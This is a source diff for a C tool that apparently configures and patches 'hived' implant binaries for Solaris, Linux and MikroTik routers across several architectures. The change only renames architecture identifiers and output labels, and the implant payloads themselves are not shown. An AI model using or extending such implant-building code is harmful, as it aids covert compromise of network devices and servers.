@@ -12,11 +12,11 @@
 #include <time.h>
 #include <trigger_protocols.h>
 #include "_unpatched_solaris_sparc.h"
-#include "_unpatched_solaris_i386.h"
-#include "_unpatched_linux_i386.h"
-#include "_unpatched_mikrotik_i386.h"
-#include "_unpatched_mikrotik_mipsbe.h"
-#include "_unpatched_mikrotik_mipsle.h"
+#include "_unpatched_solaris_x86.h"
+#include "_unpatched_linux_x86.h"
+#include "_unpatched_mikrotik_x86.h"
+#include "_unpatched_mikrotik_mips.h"
+#include "_unpatched_mikrotik_mipsel.h"
 #include "_unpatched_mikrotik_ppc.h"
 
 #include "debug.h"
@@ -28,19 +28,19 @@
 #include "./ssl/polarssl/include/polarssl/sha1.h"
 
 #define HIVE_SOLARIS_SPARC_FILE "hived-solaris-sparc-PATCHED"
-#define HIVE_SOLARIS_I386_FILE "hived-solaris-i386-PATCHED"
-#define HIVE_LINUX_I386_FILE "hived-linux-i386-PATCHED"
-#define HIVE_MIKROTIK_I386_FILE "hived-mikrotik-i386-PATCHED"
-#define HIVE_MIKROTIK_MIPSBE_FILE "hived-mikrotik-mipsbe-PATCHED"
-#define HIVE_MIKROTIK_MIPSLE_FILE "hived-mikrotik-mipsle-PATCHED"
+#define HIVE_SOLARIS_X86_FILE "hived-solaris-x86-PATCHED"
+#define HIVE_LINUX_X86_FILE "hived-linux-x86-PATCHED"
+#define HIVE_MIKROTIK_X86_FILE "hived-mikrotik-x86-PATCHED"
+#define HIVE_MIKROTIK_MIPS_FILE "hived-mikrotik-mips-PATCHED"
+#define HIVE_MIKROTIK_MIPSEL_FILE "hived-mikrotik-mipsel-PATCHED"
 #define HIVE_MIKROTIK_PPC_FILE "hived-mikrotik-ppc-PATCHED"
 
 #define HIVE_SOLARIS_SPARC_UNPATCHED "hived-solaris-sparc-UNpatched"
-#define HIVE_SOLARIS_I386_UNPATCHED "hived-solaris-i386-UNpatched"
-#define HIVE_LINUX_I386_UNPATCHED "hived-linux-i386-UNpatched"
-#define HIVE_MIKROTIK_I386_UNPATCHED "hived-mikrotik-i386-UNpatched"
-#define HIVE_MIKROTIK_MIPSBE_UNPATCHED "hived-mikrotik-mipsbe-UNpatched"
-#define HIVE_MIKROTIK_MIPSLE_UNPATCHED "hived-mikrotik-mipsle-UNpatched"
+#define HIVE_SOLARIS_X86_UNPATCHED "hived-solaris-x86-UNpatched"
+#define HIVE_LINUX_X86_UNPATCHED "hived-linux-x86-UNpatched"
+#define HIVE_MIKROTIK_X86_UNPATCHED "hived-mikrotik-x86-UNpatched"
+#define HIVE_MIKROTIK_MIPS_UNPATCHED "hived-mikrotik-mips-UNpatched"
+#define HIVE_MIKROTIK_MIPSEL_UNPATCHED "hived-mikrotik-mipsel-UNpatched"
 #define HIVE_MIKROTIK_PPC_UNPATCHED "hived-mikrotik-ppc-UNpatched"
 
 #define ID_KEY_FILE	"ID-keys.txt"
@@ -116,8 +116,8 @@ int usage(char **argv)
 	fprintf(stdout, "                             * 'raw' - all unpatched\n");
 	fprintf(stdout, "                             * 'win'\n");
 	fprintf(stdout, "                             * 'mt-x86'\n");
-	fprintf(stdout, "                             * 'mt-mipsbe'\n");
-	fprintf(stdout, "                             * 'mt-mipsle'\n");
+	fprintf(stdout, "                             * 'mt-mips'\n");
+	fprintf(stdout, "                             * 'mt-mipsel'\n");
 	fprintf(stdout, "                             * 'mt-ppc'\n");
 	fprintf(stdout, "                             * 'linux-x86'\n");
 	fprintf(stdout, "                             * 'sol-x86'\n");
@@ -156,8 +156,8 @@ int main(int argc, char **argv)
 	int solaris_sparc = 0;				// Solaris SPARC
 	int solaris_x86 = 0;				// Solaris x86
 	int mikrotik_x86 = 0;				// MikroTik x86
-	int mikrotik_mipsbe = 0;			// MikroTik MIPS Big Endian
-	int mikrotik_mipsle = 0;			// MikroTik MIPS Little Endian
+	int mikrotik_mips = 0;			// MikroTik MIPS Big Endian
+	int mikrotik_mipsel = 0;			// MikroTik MIPS Little Endian
 	int mikrotik_ppc = 0;				// MikroTik PowerPC [Big Endian]
 	int raw = 0;					// unpatched versions
 	char *host = (char *) NULL;			// cached hostname for user confirmation message
@@ -332,10 +332,10 @@ int main(int argc, char **argv)
 				mikrotik_ppc = 1;
 			} else if (strncmp(optarg, "mt-mipsb", 8) == 0) {
 				// mikrotik MIPS big endian
-				mikrotik_mipsbe = 1;
+				mikrotik_mips = 1;
 			} else if (strncmp(optarg, "mt-mipsl", 8) == 0) {
 				// mikrotik MIPS little endian
-				mikrotik_mipsle = 1;
+				mikrotik_mipsel = 1;
 			} else if (strncmp(optarg, "mt-x", 4) == 0) {
 				// mikrotik x86
 				mikrotik_x86 = 1;
@@ -353,8 +353,8 @@ int main(int argc, char **argv)
 				linux_x86 = 1;
 				solaris_x86 = 1;
 				mikrotik_x86 = 1;
-				mikrotik_mipsbe = 1;
-				mikrotik_mipsle = 1;
+				mikrotik_mips = 1;
+				mikrotik_mipsel = 1;
 				mikrotik_ppc = 1;
 			} else if (strncmp(optarg, "r", 1) == 0) {
 				// all
@@ -412,13 +412,13 @@ int main(int argc, char **argv)
 			return -1;
 		}
 
-		if ((linux_x86 == 0) && (solaris_sparc == 0) && (solaris_x86 == 0) && (mikrotik_x86 == 0) && (mikrotik_mipsbe == 0) && (mikrotik_ppc == 0) && (mikrotik_mipsle == 0)) {	// no OS was selected, so default is to build all
+		if ((linux_x86 == 0) && (solaris_sparc == 0) && (solaris_x86 == 0) && (mikrotik_x86 == 0) && (mikrotik_mips == 0) && (mikrotik_ppc == 0) && (mikrotik_mipsel == 0)) {	// no OS was selected, so default is to build all
 			solaris_sparc = 1;
 			linux_x86 = 1;
 			solaris_x86 = 1;
 			mikrotik_x86 = 1;
-			mikrotik_mipsbe = 1;
-			mikrotik_mipsle = 1;
+			mikrotik_mips = 1;
+			mikrotik_mipsel = 1;
 			mikrotik_ppc = 1;
 		}
 
@@ -472,13 +472,13 @@ int main(int argc, char **argv)
 		printf("   . MikroTik/x86\n");
 	}
 
-	if (mikrotik_mipsle == 1 || raw == 1) {
-		printf("   . MikroTik/MIPS-LE\n");
+	if (mikrotik_mipsel == 1 || raw == 1) {
+		printf("   . MikroTik/MIPS (little endian)\n");
 	}
 	// beginning of big endian targets
 
-	if (mikrotik_mipsbe == 1 || raw == 1) {
-		printf("   . MikroTik/MIPS-BE\n");
+	if (mikrotik_mips == 1 || raw == 1) {
+		printf("   . MikroTik/MIPS\n");
 	}
 
 	if (mikrotik_ppc == 1 || raw == 1) {
@@ -491,19 +491,19 @@ int main(int argc, char **argv)
 	}
 
 	remove(HIVE_SOLARIS_SPARC_FILE);
-	remove(HIVE_SOLARIS_I386_FILE);
-	remove(HIVE_LINUX_I386_FILE);
-	remove(HIVE_MIKROTIK_I386_FILE);
-	remove(HIVE_MIKROTIK_MIPSBE_FILE);
-	remove(HIVE_MIKROTIK_MIPSLE_FILE);
+	remove(HIVE_SOLARIS_X86_FILE);
+	remove(HIVE_LINUX_X86_FILE);
+	remove(HIVE_MIKROTIK_X86_FILE);
+	remove(HIVE_MIKROTIK_MIPS_FILE);
+	remove(HIVE_MIKROTIK_MIPSEL_FILE);
 	remove(HIVE_MIKROTIK_PPC_FILE);
 
 	remove(HIVE_SOLARIS_SPARC_UNPATCHED);
-	remove(HIVE_SOLARIS_I386_UNPATCHED);
-	remove(HIVE_LINUX_I386_UNPATCHED);
-	remove(HIVE_MIKROTIK_I386_UNPATCHED);
-	remove(HIVE_MIKROTIK_MIPSBE_UNPATCHED);
-	remove(HIVE_MIKROTIK_MIPSLE_UNPATCHED);
+	remove(HIVE_SOLARIS_X86_UNPATCHED);
+	remove(HIVE_LINUX_X86_UNPATCHED);
+	remove(HIVE_MIKROTIK_X86_UNPATCHED);
+	remove(HIVE_MIKROTIK_MIPS_UNPATCHED);
+	remove(HIVE_MIKROTIK_MIPSEL_UNPATCHED);
 	remove(HIVE_MIKROTIK_PPC_UNPATCHED);
 
 
@@ -513,12 +513,12 @@ int main(int argc, char **argv)
 
 	if (raw == 1) {
 		printf("\n");
-		non_patch(HIVE_LINUX_I386_UNPATCHED, hived_linux_i386_unpatched, hived_linux_i386_unpatched_len);
+		non_patch(HIVE_LINUX_X86_UNPATCHED, hived_linux_x86_unpatched, hived_linux_x86_unpatched_len);
 		non_patch(HIVE_SOLARIS_SPARC_UNPATCHED, hived_solaris_sparc_unpatched, hived_solaris_sparc_unpatched_len);
-		non_patch(HIVE_SOLARIS_I386_UNPATCHED, hived_solaris_i386_unpatched, hived_solaris_i386_unpatched_len);
-		non_patch(HIVE_MIKROTIK_I386_UNPATCHED, hived_mikrotik_i386_unpatched, hived_mikrotik_i386_unpatched_len);
-		non_patch(HIVE_MIKROTIK_MIPSLE_UNPATCHED, hived_mikrotik_mipsle_unpatched, hived_mikrotik_mipsle_unpatched_len);
-		non_patch(HIVE_MIKROTIK_MIPSBE_UNPATCHED, hived_mikrotik_mipsbe_unpatched, hived_mikrotik_mipsbe_unpatched_len);
+		non_patch(HIVE_SOLARIS_X86_UNPATCHED, hived_solaris_x86_unpatched, hived_solaris_x86_unpatched_len);
+		non_patch(HIVE_MIKROTIK_X86_UNPATCHED, hived_mikrotik_x86_unpatched, hived_mikrotik_x86_unpatched_len);
+		non_patch(HIVE_MIKROTIK_MIPSEL_UNPATCHED, hived_mikrotik_mipsel_unpatched, hived_mikrotik_mipsel_unpatched_len);
+		non_patch(HIVE_MIKROTIK_MIPS_UNPATCHED, hived_mikrotik_mips_unpatched, hived_mikrotik_mips_unpatched_len);
 		non_patch(HIVE_MIKROTIK_PPC_UNPATCHED, hived_mikrotik_ppc_unpatched, hived_mikrotik_ppc_unpatched_len);
 	}
 // We start as Little Endian.  If the binary is detected as Big Endian, then the structure
@@ -526,27 +526,27 @@ int main(int argc, char **argv)
 // parsers, check for Little Endian variants first and the Big Endian possibilities next.
 
 	if (linux_x86 == 1) {
-		patch(HIVE_LINUX_I386_FILE, hived_linux_i386_unpatched, hived_linux_i386_unpatched_len, args);
+		patch(HIVE_LINUX_X86_FILE, hived_linux_x86_unpatched, hived_linux_x86_unpatched_len, args);
 	}
 
 	if (solaris_x86 == 1) {
-		patch(HIVE_SOLARIS_I386_FILE, hived_solaris_i386_unpatched, hived_solaris_i386_unpatched_len, args);
+		patch(HIVE_SOLARIS_X86_FILE, hived_solaris_x86_unpatched, hived_solaris_x86_unpatched_len, args);
 	}
 
 	if (mikrotik_x86 == 1) {
-		patch(HIVE_MIKROTIK_I386_FILE, hived_mikrotik_i386_unpatched, hived_mikrotik_i386_unpatched_len, args);
+		patch(HIVE_MIKROTIK_X86_FILE, hived_mikrotik_x86_unpatched, hived_mikrotik_x86_unpatched_len, args);
 	}
 
-	if (mikrotik_mipsle == 1) {
-		patch(HIVE_MIKROTIK_MIPSLE_FILE, hived_mikrotik_mipsle_unpatched, hived_mikrotik_mipsle_unpatched_len, args);
+	if (mikrotik_mipsel == 1) {
+		patch(HIVE_MIKROTIK_MIPSEL_FILE, hived_mikrotik_mipsel_unpatched, hived_mikrotik_mipsel_unpatched_len, args);
 	}
 
 	if (mikrotik_ppc == 1) {
 		patch(HIVE_MIKROTIK_PPC_FILE, hived_mikrotik_ppc_unpatched, hived_mikrotik_ppc_unpatched_len, args);
 	}
 
-	if (mikrotik_mipsbe == 1) {
-		patch(HIVE_MIKROTIK_MIPSBE_FILE, hived_mikrotik_mipsbe_unpatched, hived_mikrotik_mipsbe_unpatched_len, args);
+	if (mikrotik_mips == 1) {
+		patch(HIVE_MIKROTIK_MIPS_FILE, hived_mikrotik_mips_unpatched, hived_mikrotik_mips_unpatched_len, args);
 	}
 // beginning of big endian targets
 	if (solaris_sparc == 1) {
